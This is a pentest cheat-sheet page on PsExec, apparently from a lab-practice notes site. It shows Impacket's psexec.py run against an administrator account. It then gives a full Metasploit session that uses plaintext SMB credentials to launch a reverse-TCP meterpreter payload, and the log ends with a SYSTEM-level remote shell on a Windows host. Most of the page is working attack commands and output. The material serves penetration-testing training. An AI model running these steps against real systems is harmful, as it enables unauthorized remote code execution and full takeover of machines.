---
layout: default
title: PsExec
parent: Shells
nav_order: 4
---

# PsExec

---

## PsExec from Impacket

[Impacket GitHub Repo for psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py)

```bash
psexec.py Administrator@10.2.24.221 cmd.exe

Password:
```

![psexec](../../../assets/images/shells/psexec.png)

## PsExec with Metasploit Framework

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ msfconsole -q
msf6 > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.4.22.77
RHOSTS => 10.4.22.77
msf6 exploit(windows/smb/psexec) > set SMBUser administrator
SMBUser => administrator
msf6 exploit(windows/smb/psexec) > set SMBPass password1
SMBPass => password1
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.4.2:4444
[*] 10.4.22.77:445 - Connecting to the server...
[*] 10.4.22.77:445 - Authenticating to 10.4.22.77:445 as user 'administrator'...
[*] 10.4.22.77:445 - Selecting PowerShell target
[*] 10.4.22.77:445 - Executing the payload...
[+] 10.4.22.77:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.4.22.77
[*] Meterpreter session 1 opened (10.10.4.2:4444 -> 10.4.22.77:49365 ) at 2023-11-30 08:53:44 +0530

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : SAMPLE
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows

```
